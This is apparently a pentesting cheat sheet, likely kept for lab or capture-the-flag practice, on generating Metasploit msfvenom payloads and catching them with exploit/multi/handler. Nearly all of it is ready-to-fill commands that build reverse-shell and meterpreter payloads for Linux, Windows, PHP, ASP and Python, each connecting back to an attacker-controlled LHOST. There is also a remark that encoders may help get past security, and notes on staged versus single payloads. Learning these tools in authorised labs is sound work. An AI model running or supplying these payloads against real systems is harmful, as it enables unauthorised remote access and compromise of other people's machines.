`msfvenom -p PAYLOAD_PATH LHOST=X.X.X.X -f exe(FORMAT) -o payload.exe(OUTPUT)`
`msfvenom -l payloads`
`msfvenom --list formats`
*Encoders are ot intended to bypass security, but may help* `msfvenom -l encoders`
#### Handlers
`use exploit/multi/handler` -> `set payload php/reverse_php` *(optional) omit for meterpreter shell*-\> `set lhost MY_IP` -\> `set lport MY_IP` -\> `run` *infers listener running*
#### Payload Examples
*must have set up listener or `exploit/multi/handler` module set up/listening for reverse shells above*
- Linux (elf): `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
- Windows: `msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`
- PHP: `msfvenom -p php/meterpreter\_reverse\_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`
- ASP: `msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev\_shell.asp`
- Python: `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`
- `msfvenom -l payloads | grep meterpreter`, shows reverse and bind meterpreter shells on different platforms

*Consider: target OS, programs on the system, available connection types*

# Single vs. Staged
Stages: Downloaded by the stager after access is achieved on the target
`generic/shell_reverse_tcp` - denotes an single payload
`windows/x64/shell/reverse_tcp` - denotes a staged payload (stager + stage)